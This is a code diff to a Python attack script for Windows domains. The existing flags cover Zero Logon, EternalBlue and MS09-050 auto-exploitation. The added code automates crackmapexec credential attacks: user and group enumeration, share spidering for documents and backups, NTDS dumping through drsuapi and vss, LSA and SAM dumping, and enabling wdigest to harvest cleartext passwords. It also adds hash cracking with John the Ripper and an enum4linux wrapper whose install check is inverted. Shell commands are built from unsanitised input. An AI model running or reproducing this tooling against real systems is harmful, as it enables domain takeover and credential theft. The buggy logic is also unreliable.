@@ -32,6 +32,8 @@ parser.add_argument("-Z", "--Zero", action="store_true", help="Zero Logon Attack
 parser.add_argument("-E", "--Eternal", action="store_true", help="Test for EternalBlue and automatically exploit")
 parser.add_argument("-9", "--MS09050", action="store_true", help="Test for MS09-050 and automatically exploit")
 parser.add_argument("-M", "--Mimikatz", action="store_true", help="Will run mimikatz with crackmapexec, note takes a long time to run")
+parser.add_argument("-e", "--enum4linux", action="store_true", help="Will run enum4linux")
+parser.add_argument("-c", "--crack", action="store_true", help="Crack hashes with john the ripper")
 args = parser.parse_args()
 
 def scan():
@@ -216,6 +218,20 @@ def MS09050():
 	else:
 		print("\033[1;32m Not vulnerable\033[1;39m")
 
+def enum4linux():
+	ret_code = system("which enum4linux")
+	if ret_code != 0:
+		system("enum4linux "+domainip+"")
+	else:
+		print("\033[1;31m Downloading enum4linux\033[1;39m")
+		system("sudo apt install enum4linux -y")
+		system("enum4linux "+domainip+"")
+
+def crack():
+	file = input("\033[1;31m File where hashes are stored that need to be cracked?")
+	print("\033[1;31m Wordlist is rockyou.txt and trying to crack hashes\033[1;39m")
+	system("john "+file+" --wordlist=/usr/share/wordlists/rockyou.txt") #change wordlist if needed here
+
 def zero():
 	print("\033[1;31m Need to put Domain Name in /etc/hosts")
 	input("\033[1;32m Press enter when finished:\033[1;39m")
@@ -254,12 +270,36 @@ def crackmapexec():
 		system(c+" winrm "+domainip+"")
 		print("\033[1;31m Testing shares access\033[1;39m")
 		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --shares")
+		print("\033[1;31m Find other users\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --users")		
 		print("\033[1;31m Checking for logged on users\033[1;39m")
 		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --loggedon-users")
+		print("\033[1;31m Enumerating Groups on target machine\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --groups")		
+		print("\033[1;31m Finding txt files, bak, bac, zip and pdfs. This will take a minute\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern txt")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern zip")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern bak")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern pdf")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern bac")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern 7zip")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern doc")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern docx")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --spider C\\$ --pattern log")
+		print("\033[1;31m Finding active sessions\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --sessions")
+		print("\033[1;31m Finding other drives\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --disks")	
+		print("\033[1;31m Trying to dump drsuapi, this may take a minute\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --ntds drsuapi")
+		print("\033[1;31m Trying to dump vss, this may take a minute\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --ntds vss")
 		print("\033[1;31m Trying to dump LSA, this may take a minute\033[1;39m")
 		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --lsa")
 		print("\033[1;31m Trying to dump SAM\033[1;39m")
 		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" --sam")
+		print("\033[1;31m Trying to enable wdigest\033[1;39m")
+		system(c+" "+s+" "+domainip+" -u "+username+" -p "+password+" -M wdigest -o ACTION=enable")
 	if subnet and (len(password) != 0) and (len(username) != 0):
 		print("\033[1;31m Trying to login to entire subnet\033[1;39m")
 		system(c+" "+s+" "+subnet+" -u "+username+" -p "+password+" --local-auth")
@@ -408,3 +448,7 @@ if args.MS09050 == True:
 	MS09050()
 if args.BloodHound == True:
 	bloodhound()
+if args.crack == True:
+	crack()
+if args.enum4linux == True:
+	enum4linux()
